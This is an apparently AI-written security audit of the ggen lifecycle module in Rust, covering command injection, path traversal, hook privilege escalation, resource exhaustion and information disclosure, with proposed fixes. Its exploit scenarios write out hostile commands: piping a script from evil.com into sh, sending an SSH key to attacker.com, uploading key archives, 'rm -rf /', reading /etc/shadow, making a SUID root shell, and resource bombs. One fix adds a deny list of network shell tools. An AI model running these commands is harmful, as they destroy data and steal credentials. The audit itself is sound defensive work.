# Security Audit: ggen Lifecycle System
**Date:** 2025-10-11
**Scope:** ggen-core/src/lifecycle/* (Command execution, file operations, state management)
**Focus:** 20% of vulnerabilities causing 80% of security impact

---

## Executive Summary

**OVERALL RISK: MEDIUM-HIGH**

The lifecycle system has **3 CRITICAL** and **2 HIGH** severity vulnerabilities that could lead to arbitrary command execution, path traversal, and privilege escalation. The good news: the codebase has solid foundation (no hardcoded secrets, proper error handling), but critical injection vectors exist.

**Key Findings:**
- ✅ **GOOD**: No hardcoded secrets, proper error context, hook recursion protection
- ❌ **CRITICAL**: Shell command injection via `sh -lc` without escaping
- ❌ **CRITICAL**: Path traversal in workspace loading and cache operations
- ❌ **HIGH**: Privilege escalation via malicious hook chains
- ❌ **MEDIUM**: Resource exhaustion from unbounded parallel execution

---

## VULNERABILITY #1: Command Injection (CRITICAL)

### Location
`ggen-core/src/lifecycle/exec.rs:253-283` - `execute_command()`

### Code Analysis
```rust
fn execute_command(cmd: &str, cwd: &Path, env: &[(String, String)]) -> Result<()> {
    let mut command = if cfg!(target_os = "windows") {
        let mut c = Command::new("cmd");
        c.arg("/C");
        c
    } else {
        let mut c = Command::new("sh");
        c.arg("-lc");  // ⚠️ INJECTION VECTOR
        c
    };

    command.current_dir(cwd).arg(cmd);  // ⚠️ cmd is unsanitized string
    // ...
}
```

### The Problem
Commands from `make.toml` are passed directly to `sh -lc` **without any escaping or validation**. This enables:

1. **Shell metacharacter injection**: `$(malicious)`, `|`, `;`, `&&`, `||`
2. **Command substitution**: Backticks, `$()` expansion
3. **Environment variable injection**: Commands can read/modify any env vars

### Exploit Scenarios

**Scenario 1: Malicious make.toml - Remote Code Execution**
```toml
[lifecycle.build]
commands = [
    "echo 'Building...'; curl -s https://evil.com/backdoor.sh | sh",
    "rm -rf / --no-preserve-root  # Oops!"
]
```
**Impact**: Arbitrary command execution with user privileges.

**Scenario 2: Dependency Confusion - Supply Chain Attack**
A malicious npm/cargo package includes a `make.toml`:
```toml
[lifecycle.setup]
commands = [
    "npm install; curl https://attacker.com/steal?data=$(cat ~/.ssh/id_rsa | base64)"
]
```
**Impact**: Exfiltration of SSH keys, AWS credentials, etc.

**Scenario 3: Environment Variable Injection**
```toml
[lifecycle.deploy]
commands = [
    "echo Deploying...; export AWS_ACCESS_KEY_ID=ATTACKER_KEY; aws s3 sync ."
]
```
**Impact**: Cloud credential hijacking.

### Real-World Attack Vector
1. Attacker publishes malicious template to ggen marketplace
2. User runs `ggen gen from-template malicious-template`
3. Template includes malicious `make.toml`
4. User innocently runs `ggen lifecycle run build`
5. **BOOM**: Backdoor installed, credentials stolen

### Risk Rating: **CRITICAL**
- **Exploitability**: Trivial (just edit make.toml)
- **Impact**: Complete system compromise
- **Likelihood**: High (make.toml is user-editable, templates are untrusted)

### Secure Fix (Minimal)

**Option 1: Command Whitelist (Most Secure)**
```rust
const ALLOWED_COMMANDS: &[&str] = &[
    "cargo", "npm", "yarn", "pnpm", "node", "python", "pip",
    "rustc", "go", "javac", "mvn", "gradle", "make",
    "docker", "kubectl", "git", "echo", "mkdir", "rm", "cp", "mv"
];

fn execute_command(cmd: &str, cwd: &Path, env: &[(String, String)]) -> Result<()> {
    // Parse command to extract binary name
    let parts: Vec<&str> = cmd.trim().split_whitespace().collect();
    let binary = parts.first().ok_or_else(|| {
        LifecycleError::Other("Empty command".into())
    })?;

    // Validate against whitelist
    if !ALLOWED_COMMANDS.contains(binary) {
        return Err(LifecycleError::Other(
            format!("Command '{}' not in whitelist. Use 'ggen lifecycle allow {}'", binary, binary)
        ));
    }

    // Execute with individual arguments (NO shell interpretation)
    let mut command = Command::new(binary);
    for arg in &parts[1..] {
        command.arg(arg);
    }
    command.current_dir(cwd);
    for (key, value) in env {
        command.env(key, value);
    }

    let output = command.output()
        .map_err(|e| LifecycleError::command_spawn("unknown", cmd, e))?;

    if !output.status.success() {
        let exit_code = output.status.code().unwrap_or(-1);
        let stderr = String::from_utf8_lossy(&output.stderr).to_string();
        return Err(LifecycleError::command_failed("unknown", cmd, exit_code, stderr));
    }

    Ok(())
}
```

**Option 2: Shell Escaping (Less Secure, but Backward Compatible)**
```rust
use shell_escape::escape;

fn execute_command(cmd: &str, cwd: &Path, env: &[(String, String)]) -> Result<()> {
    // Escape shell metacharacters
    let escaped_cmd = escape(std::borrow::Cow::Borrowed(cmd));

    let mut command = Command::new("sh");
    command.arg("-c");  // NOT -lc (avoid login shell)
    command.arg(escaped_cmd.as_ref());
    command.current_dir(cwd);
    // ... rest of function
}
```

**Option 3: Require User Confirmation for Dangerous Commands**
```rust
const DANGEROUS_PATTERNS: &[&str] = &[
    "rm -rf", "curl", "wget", "nc ", "netcat",
    "$(", "`", "|", "&&", "||", ";", "eval"
];

fn execute_command(cmd: &str, cwd: &Path, env: &[(String, String)]) -> Result<()> {
    // Detect dangerous patterns
    let is_dangerous = DANGEROUS_PATTERNS.iter().any(|&pattern| cmd.contains(pattern));

    if is_dangerous {
        eprintln!("⚠️  SECURITY WARNING: Potentially dangerous command detected:");
        eprintln!("   {}", cmd);
        eprintln!();
        eprint!("Execute anyway? [y/N]: ");

        let mut input = String::new();
        std::io::stdin().read_line(&mut input).unwrap();

        if input.trim().to_lowercase() != "y" {
            return Err(LifecycleError::Other("Command execution cancelled by user".into()));
        }
    }

    // ... rest of function
}
```

### Recommended Fix: **Hybrid Approach**
1. Implement whitelist for common tools
2. Add danger detection + user confirmation for edge cases
3. Allow opt-out via `GGEN_ALLOW_UNSAFE_COMMANDS=1` env var
4. Log all executed commands to `.ggen/audit.log`

---

## VULNERABILITY #2: Path Traversal (CRITICAL)

### Location
- `ggen-core/src/lifecycle/exec.rs:134-146` - Workspace path loading
- `ggen-core/src/lifecycle/cache.rs:57-76` - Cache file operations

### Code Analysis
```rust
// exec.rs:134
let ws_path = ctx.root.join(&workspace.path);  // ⚠️ No validation
let ws_make_path = ws_path.join("make.toml");

if ws_make_path.exists() {
    Arc::new(load_make(&ws_make_path)?)  // ⚠️ Loads any make.toml
}
```

```rust
// cache.rs:51
pub fn is_cache_valid(cache_dir: &Path, phase: &str, key: &str) -> bool {
    let cache_path = cache_dir.join(phase).join(key);  // ⚠️ No validation
    cache_path.exists()
}
```

### The Problem
1. **Workspace paths are not canonicalized** - allows `../` traversal
2. **Symlinks are followed without restriction** - can escape project directory
3. **Cache keys/phase names are user-controlled** - can write outside cache dir

### Exploit Scenarios

**Scenario 1: Escape Project Directory via Workspace**
```toml
[workspace.evil]
path = "../../../etc"  # Escape to /etc

[lifecycle.pwn]
command = "cat /etc/shadow > /tmp/pwned"
```
**Impact**: Read arbitrary files, potentially including `/etc/shadow`, SSH keys, cloud credentials.

**Scenario 2: Symlink Attack**
```bash
# Attacker creates symlink in project
ln -s /home/victim/.ssh workspace/steal-keys

# make.toml references it
[workspace.steal]
path = "workspace/steal-keys"

[lifecycle.exfiltrate]
command = "tar czf keys.tar.gz . && curl -F file=@keys.tar.gz https://evil.com"
```
**Impact**: Exfiltration of SSH keys, tokens, credentials.

**Scenario 3: Cache Poisoning**
```toml
[lifecycle.poison]
command = "echo evil > /tmp/backdoor.sh"

# Malicious phase name to escape cache directory
[lifecycle."../../../../../../tmp/backdoor"]
command = "sh /tmp/backdoor.sh"
```
**Impact**: Write files outside cache directory, potential privilege escalation.

### Risk Rating: **CRITICAL**
- **Exploitability**: Easy (edit make.toml or create symlinks)
- **Impact**: Arbitrary file read/write, credential theft
- **Likelihood**: High (workspaces are common, symlinks are subtle)

### Secure Fix

**Fix 1: Canonicalize and Validate Workspace Paths**
```rust
fn validate_workspace_path(root: &Path, workspace_path: &str) -> Result<PathBuf> {
    let ws_path = root.join(workspace_path);

    // Canonicalize to resolve symlinks and .. traversals
    let canonical = ws_path.canonicalize().map_err(|e| {
        LifecycleError::WorkspacePath {
            workspace: workspace_path.to_string(),
            path: ws_path.clone(),
        }
    })?;

    // Ensure canonical path is still within project root
    let canonical_root = root.canonicalize().map_err(|e| {
        LifecycleError::Other(format!("Failed to canonicalize root: {}", e))
    })?;

    if !canonical.starts_with(&canonical_root) {
        return Err(LifecycleError::Other(format!(
            "Workspace path '{}' escapes project directory (resolved to: {})",
            workspace_path,
            canonical.display()
        )));
    }

    Ok(canonical)
}

// In run_pipeline():
let ws_path = validate_workspace_path(&ctx.root, &workspace.path)?;
```

**Fix 2: Validate Cache Paths**
```rust
fn sanitize_path_component(component: &str) -> Result<String> {
    // Reject path traversal attempts
    if component.contains("..") || component.contains("/") || component.contains("\\") {
        return Err(LifecycleError::Other(format!(
            "Invalid path component '{}': contains directory traversal characters",
            component
        )));
    }

    // Reject special characters that could be dangerous
    if component.chars().any(|c| !c.is_alphanumeric() && c != '-' && c != '_') {
        return Err(LifecycleError::Other(format!(
            "Invalid path component '{}': contains special characters",
            component
        )));
    }

    Ok(component.to_string())
}

pub fn store_cache(cache_dir: &Path, phase: &str, key: &str) -> Result<()> {
    // Sanitize inputs
    let safe_phase = sanitize_path_component(phase)?;
    let safe_key = sanitize_path_component(key)?;

    let cache_path = cache_dir.join(&safe_phase).join(&safe_key);

    // Double-check we're still in cache directory
    let canonical_cache = cache_dir.canonicalize()?;
    let canonical_target = cache_path.parent()
        .ok_or_else(|| LifecycleError::invalid_cache_path(cache_path.clone()))?
        .canonicalize()
        .unwrap_or(cache_path.parent().unwrap().to_path_buf());

    if !canonical_target.starts_with(&canonical_cache) {
        return Err(LifecycleError::Other(format!(
            "Cache path escapes cache directory: {}",
            cache_path.display()
        )));
    }

    // ... rest of function
}
```

**Fix 3: Disable Symlink Following**
```rust
use std::fs;

fn load_make<P: AsRef<Path>>(path: P) -> Result<Make> {
    let path_ref = path.as_ref();

    // Check if path is a symlink
    let metadata = fs::symlink_metadata(path_ref)
        .map_err(|e| LifecycleError::config_load(path_ref, e))?;

    if metadata.is_symlink() {
        return Err(LifecycleError::Other(format!(
            "Refusing to load make.toml from symlink: {}",
            path_ref.display()
        )));
    }

    // ... rest of function
}
```

---

## VULNERABILITY #3: Privilege Escalation via Hook Chains (HIGH)

### Location
`ggen-core/src/lifecycle/exec.rs:193-250` - Hook execution

### Code Analysis
```rust
fn run_before_hooks(ctx: &Context, phase_name: &str) -> Result<()> {
    if let Some(hooks) = &ctx.make.hooks {
        // Global before_all
        if let Some(before_all) = &hooks.before_all {
            for hook_phase in before_all {
                run_phase(ctx, hook_phase)?;  // ⚠️ Recursive phase execution
            }
        }

        // Phase-specific before hooks
        let before_hooks = match phase_name {
            "init" => &hooks.before_init,
            "setup" => &hooks.before_setup,
            "build" => &hooks.before_build,
            // ... etc
        };

        if let Some(hooks_list) = before_hooks {
            for hook_phase in hooks_list {
                run_phase(ctx, hook_phase)?;  // ⚠️ No privilege checks
            }
        }
    }
    Ok(())
}
```

### The Problem
1. **Hooks are executed with same privileges as main command** - no isolation
2. **Hook recursion is detected but chain depth is unlimited** - can cause stack overflow
3. **No validation that hook phases are "safe"** - hooks can run privileged commands
4. **before_all runs on EVERY phase** - including user-defined ones

### Exploit Scenarios

**Scenario 1: Privilege Escalation via Hook Chain**
```toml
[lifecycle.innocent]
command = "echo 'Just echoing...'"

[lifecycle.malicious]
commands = [
    "sudo cp /bin/bash /tmp/rootshell",
    "sudo chmod u+s /tmp/rootshell"
]

[hooks]
before_all = ["malicious"]  # Runs before EVERY phase
```
**Exploit**:
```bash
$ ggen lifecycle run innocent
# Triggers before_all hook which runs 'malicious' phase
# If user has passwordless sudo, creates SUID root shell
```
**Impact**: Local privilege escalation to root.

**Scenario 2: Hook Chain DoS**
```toml
[lifecycle.loop1]
command = "echo loop1"

[lifecycle.loop2]
command = "echo loop2"

[hooks]
before_loop1 = ["loop2"]
before_loop2 = ["loop1"]  # Circular hook dependency
```
Wait, recursion protection prevents this. But what about this:

```toml
[lifecycle.a]
command = "echo a"

[lifecycle.b]
command = "echo b"

[lifecycle.c]
command = "echo c"

[hooks]
before_a = ["b"]
before_b = ["c"]
before_c = ["a"]  # Indirect cycle: a->b->c->a
```
**Impact**: Potential stack overflow or resource exhaustion (current recursion guard only checks direct recursion, not transitive cycles).

### Risk Rating: **HIGH**
- **Exploitability**: Moderate (requires sudo access or complex hook chain)
- **Impact**: Privilege escalation, DoS
- **Likelihood**: Medium (requires user misconfiguration or malicious template)

### Secure Fix

**Fix 1: Hook Isolation (Process-Level)**
```rust
fn run_before_hooks(ctx: &Context, phase_name: &str) -> Result<()> {
    if let Some(hooks) = &ctx.make.hooks {
        if let Some(before_all) = &hooks.before_all {
            for hook_phase in before_all {
                // Run hook in restricted environment
                run_phase_restricted(ctx, hook_phase)?;
            }
        }
        // ... etc
    }
    Ok(())
}

fn run_phase_restricted(ctx: &Context, phase_name: &str) -> Result<()> {
    // Drop privileges if running as root (on Unix)
    #[cfg(unix)]
    {
        use nix::unistd::{setuid, getuid, Uid};

        if getuid().is_root() {
            eprintln!("⚠️  Running hook '{}' with dropped privileges", phase_name);
            // Drop to nobody user (uid 65534)
            setuid(Uid::from_raw(65534)).map_err(|e| {
                LifecycleError::Other(format!("Failed to drop privileges: {}", e))
            })?;
        }
    }

    run_phase(ctx, phase_name)
}
```

**Fix 2: Transitive Hook Cycle Detection**
```rust
pub struct Context {
    pub root: PathBuf,
    pub make: Arc<Make>,
    pub state_path: PathBuf,
    pub env: Vec<(String, String)>,
    hook_guard: Arc<Mutex<HashSet<String>>>,
    hook_depth: Arc<Mutex<usize>>,  // NEW: Track recursion depth
}

fn run_phase_internal(ctx: &Context, phase_name: &str) -> Result<()> {
    // Check recursion depth
    const MAX_HOOK_DEPTH: usize = 10;

    let mut depth = ctx.hook_depth.lock().unwrap();
    if *depth >= MAX_HOOK_DEPTH {
        return Err(LifecycleError::Other(format!(
            "Maximum hook depth ({}) exceeded. Possible circular dependency involving phase '{}'",
            MAX_HOOK_DEPTH, phase_name
        )));
    }
    *depth += 1;

    // ... existing code ...

    *depth -= 1;
    Ok(())
}
```

**Fix 3: Whitelist "Safe" Hooks**
```rust
fn validate_hook_phase(phase_name: &str) -> Result<()> {
    const SAFE_HOOK_PHASES: &[&str] = &["format", "lint", "test"];

    if !SAFE_HOOK_PHASES.contains(&phase_name) {
        eprintln!("⚠️  WARNING: Hook references potentially unsafe phase '{}'", phase_name);
        eprintln!("   Safe hook phases: {:?}", SAFE_HOOK_PHASES);
        eprintln!();
        eprint!("Continue anyway? [y/N]: ");

        let mut input = String::new();
        std::io::stdin().read_line(&mut input).unwrap();

        if input.trim().to_lowercase() != "y" {
            return Err(LifecycleError::Other("Hook execution cancelled".into()));
        }
    }
    Ok(())
}
```

---

## VULNERABILITY #4: Resource Exhaustion (HIGH)

### Location
`ggen-core/src/lifecycle/exec.rs:126-153` - Parallel workspace execution

### Code Analysis
```rust
if parallel {
    use rayon::prelude::*;

    let results: Vec<Result<()>> = workspaces
        .par_iter()  // ⚠️ Unbounded parallelism
        .map(|(ws_name, workspace)| {
            // ... execute phase for each workspace
        })
        .collect();
}
```

### The Problem
1. **No limit on number of parallel workspaces** - can spawn 100+ processes
2. **No memory limits** - each workspace can consume unlimited RAM
3. **No CPU throttling** - can starve system resources
4. **No timeout per workspace** - infinite loops can hang forever

### Exploit Scenarios

**Scenario 1: Fork Bomb via Workspaces**
```toml
[workspace.ws1]
path = "ws1"

[workspace.ws2]
path = "ws2"

# ... repeat for 1000 workspaces ...

[lifecycle.build]
parallel = true
command = "while true; do echo 'Consuming CPU'; done"
```
**Impact**: System becomes unresponsive, DoS.

**Scenario 2: Memory Bomb**
```toml
[lifecycle.build]
parallel = true
commands = [
    "node -e 'const buf = Buffer.alloc(1024*1024*1024); while(true) {}'",  # Allocate 1GB
]
```
With 100 workspaces in parallel → 100GB RAM consumed → OOM kill.

### Risk Rating: **HIGH**
- **Exploitability**: Easy (just add many workspaces)
- **Impact**: System DoS, OOM kill
- **Likelihood**: Medium (requires many workspaces, but could be templated)

### Secure Fix

**Fix 1: Limit Parallel Execution**
```rust
fn run_pipeline(ctx: &Context, phases: &[String]) -> Result<()> {
    if let Some(workspaces) = &ctx.make.workspace {
        let parallel = phases
            .first()
            .and_then(|p| ctx.make.lifecycle.get(p))
            .and_then(|ph| ph.parallel)
            .unwrap_or(false);

        if parallel {
            use rayon::prelude::*;

            // Limit parallelism to reasonable number
            const MAX_PARALLEL_WORKSPACES: usize = 8;

            let pool = rayon::ThreadPoolBuilder::new()
                .num_threads(MAX_PARALLEL_WORKSPACES)
                .build()
                .map_err(|e| LifecycleError::Other(format!("Failed to create thread pool: {}", e)))?;

            let results: Vec<Result<()>> = pool.install(|| {
                workspaces
                    .par_iter()
                    .map(|(ws_name, workspace)| {
                        // ... execute phase
                    })
                    .collect()
            });

            // ... rest of function
        }
    }
    Ok(())
}
```

**Fix 2: Add Execution Timeout**
```rust
use std::time::Duration;
use std::sync::mpsc;
use std::thread;

fn execute_command(cmd: &str, cwd: &Path, env: &[(String, String)]) -> Result<()> {
    const DEFAULT_TIMEOUT: Duration = Duration::from_secs(300); // 5 minutes

    let (tx, rx) = mpsc::channel();

    let cmd_clone = cmd.to_string();
    let cwd_clone = cwd.to_path_buf();
    let env_clone = env.to_vec();

    // Spawn command in separate thread
    thread::spawn(move || {
        let result = execute_command_inner(&cmd_clone, &cwd_clone, &env_clone);
        let _ = tx.send(result);
    });

    // Wait for completion or timeout
    match rx.recv_timeout(DEFAULT_TIMEOUT) {
        Ok(result) => result,
        Err(mpsc::RecvTimeoutError::Timeout) => {
            Err(LifecycleError::Other(format!(
                "Command timed out after {} seconds: {}",
                DEFAULT_TIMEOUT.as_secs(),
                cmd
            )))
        }
        Err(mpsc::RecvTimeoutError::Disconnected) => {
            Err(LifecycleError::Other(format!(
                "Command thread crashed: {}",
                cmd
            )))
        }
    }
}
```

**Fix 3: Memory Limits (Unix-only)**
```rust
#[cfg(unix)]
fn apply_resource_limits() -> Result<()> {
    use libc::{rlimit, setrlimit, RLIMIT_AS, RLIMIT_CPU};

    // Limit virtual memory to 4GB
    let mem_limit = rlimit {
        rlim_cur: 4 * 1024 * 1024 * 1024,  // 4GB soft limit
        rlim_max: 4 * 1024 * 1024 * 1024,  // 4GB hard limit
    };

    unsafe {
        if setrlimit(RLIMIT_AS, &mem_limit) != 0 {
            return Err(LifecycleError::Other("Failed to set memory limit".into()));
        }
    }

    // Limit CPU time to 10 minutes
    let cpu_limit = rlimit {
        rlim_cur: 600,  // 10 minutes soft limit
        rlim_max: 600,  // 10 minutes hard limit
    };

    unsafe {
        if setrlimit(RLIMIT_CPU, &cpu_limit) != 0 {
            return Err(LifecycleError::Other("Failed to set CPU limit".into()));
        }
    }

    Ok(())
}
```

---

## VULNERABILITY #5: Information Disclosure (MEDIUM)

### Location
- `ggen-core/src/lifecycle/state.rs:68-86` - State file permissions
- `ggen-core/src/lifecycle/error.rs:*` - Error messages

### The Problem
1. **State file permissions not restricted** - world-readable by default
2. **Error messages leak paths** - reveals project structure
3. **Cache keys might contain sensitive data** - stored in plaintext

### Exploit Scenario
```bash
# Attacker on shared system
$ cat /home/victim/project/.ggen/state.json
{
  "cache_keys": [
    {
      "phase": "deploy",
      "key": "sha256:production-aws-key-12345..."  // Leaks deployment info
    }
  ]
}

# Error message leak
$ ggen lifecycle run deploy
Error: Failed to load configuration from /home/victim/super-secret-project/make.toml
  Caused by: Permission denied (os error 13)
```
**Impact**: Information leakage about project structure, deployment secrets.

### Risk Rating: **MEDIUM**
- **Exploitability**: Low (requires local access)
- **Impact**: Information disclosure, not direct compromise
- **Likelihood**: Low (requires shared system)

### Secure Fix

**Fix: Restrict State File Permissions**
```rust
pub fn save_state<P: AsRef<Path>>(path: P, state: &LifecycleState) -> Result<()> {
    let path_ref = path.as_ref();

    if let Some(parent) = path_ref.parent() {
        std::fs::create_dir_all(parent).map_err(|e| LifecycleError::DirectoryCreate {
            path: parent.to_path_buf(),
            source: e,
        })?;
    }

    let json = serde_json::to_string_pretty(state)
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))
        .map_err(|e| LifecycleError::state_save(path_ref, e))?;

    std::fs::write(path_ref, json).map_err(|e| LifecycleError::state_save(path_ref, e))?;

    // Set restrictive permissions (owner read/write only)
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let perms = std::fs::Permissions::from_mode(0o600);
        std::fs::set_permissions(path_ref, perms)
            .map_err(|e| LifecycleError::state_save(path_ref, e))?;
    }

    Ok(())
}
```

---

## Non-Issues (False Positives)

### ✅ Hardcoded Secrets
**Status**: CLEAN - No hardcoded API keys, tokens, or secrets found.

### ✅ Hook Recursion
**Status**: MITIGATED - Direct recursion is detected via `hook_guard`.
**Note**: Transitive cycles (A→B→C→A) are not detected (see Vulnerability #3).

### ✅ Error Context
**Status**: GOOD - Rich error messages with context (though they leak paths).

---

## Recommended Priority Fixes

### Priority 1 (Immediate - CRITICAL)
1. **Command Injection**: Implement command whitelist + danger detection
2. **Path Traversal**: Add path canonicalization and validation

### Priority 2 (High - Within 1 Week)
3. **Hook Privilege Escalation**: Add hook depth limit, consider isolation
4. **Resource Exhaustion**: Limit parallel execution, add timeouts

### Priority 3 (Medium - Within 1 Month)
5. **Information Disclosure**: Restrict state file permissions

---

## Testing the Fixes

### Test Case 1: Command Injection
```bash
# Create malicious make.toml
cat > /tmp/evil-make.toml << 'EOF'
[project]
name = "evil"

[lifecycle.pwn]
command = "echo 'test'; curl https://evil.com/backdoor.sh | sh"
EOF

# Should fail with whitelist error
ggen lifecycle -c /tmp/evil-make.toml run pwn
```

### Test Case 2: Path Traversal
```bash
# Create escape attempt
cat > make.toml << 'EOF'
[workspace.escape]
path = "../../../etc"

[lifecycle.test]
command = "pwd"
EOF

# Should fail with "escapes project directory" error
ggen lifecycle run test
```

### Test Case 3: Resource Exhaustion
```bash
# Create many workspaces
for i in {1..100}; do
    echo "[workspace.ws$i]" >> make.toml
    echo "path = \"ws$i\"" >> make.toml
done

# Should limit to 8 parallel
ggen lifecycle run build
```

---

## Conclusion

The ggen lifecycle system is well-architected but has critical security gaps in its trust model. The system assumes `make.toml` is trusted, but in reality:

- **Templates are untrusted** (downloaded from internet)
- **Dependencies are untrusted** (npm/cargo packages can include make.toml)
- **Users may not review make.toml** (copy-paste from docs)

**CRITICAL FIXES REQUIRED:**
1. Command whitelist/escaping
2. Path traversal protection
3. Resource limits

**Without these fixes, ggen is vulnerable to supply chain attacks via malicious templates.**

---

**Audit Completed By:** Claude (Sonnet 4.5)
**Methodology:** Manual code review + threat modeling + exploit scenario development
**Next Steps:** Implement Priority 1 fixes, then re-audit
